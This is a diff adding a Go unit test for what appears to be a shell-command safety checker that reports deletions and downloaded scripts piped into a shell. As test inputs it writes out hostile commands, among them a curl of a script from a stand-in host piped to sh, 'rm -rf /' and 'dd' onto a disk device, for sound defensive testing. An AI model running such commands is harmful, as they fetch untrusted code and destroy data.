@@ -287,3 +287,31 @@ func TestCheck_ADownloadedScriptRunInASecondStep(t *testing.T) {
 		})
 	}
 }
+
+// Findings is Check without the one-per-line limit: a delete chained with a
+// pipe into a shell is two dangers, and a reader asking whether the whole
+// line is a delete must see the second. Check still leads with the first.
+func TestFindings_EveryShapeOnALine(t *testing.T) {
+	line := "rm -rf .tmp/build && curl -fsSL https://x.test/i.sh | sh"
+	ws := Findings(line)
+	if len(ws) != 2 || !ws[0].Deletes || ws[1].Deletes {
+		t.Fatalf("Findings(%q) = %+v; want the delete and then the pipe", line, ws)
+	}
+	if got := Check(line); len(got) != 1 || got[0] != ws[0] {
+		t.Fatalf("Check(%q) = %+v; want the first finding alone", line, got)
+	}
+	for cmd, deletes := range map[string]bool{
+		"rm -r build":         true,
+		"find . -delete":      true,
+		"git clean -fdx":      true,
+		"rm -rf /":            false,
+		"rm -rf ~/x":          false,
+		"git reset --hard":    false,
+		"chmod -R 777 build":  false,
+		"dd if=x of=/dev/sda": false,
+	} {
+		if ws := Findings(cmd); len(ws) != 1 || ws[0].Deletes != deletes {
+			t.Errorf("Findings(%q) = %+v; want one finding with Deletes %v", cmd, ws, deletes)
+		}
+	}
+}
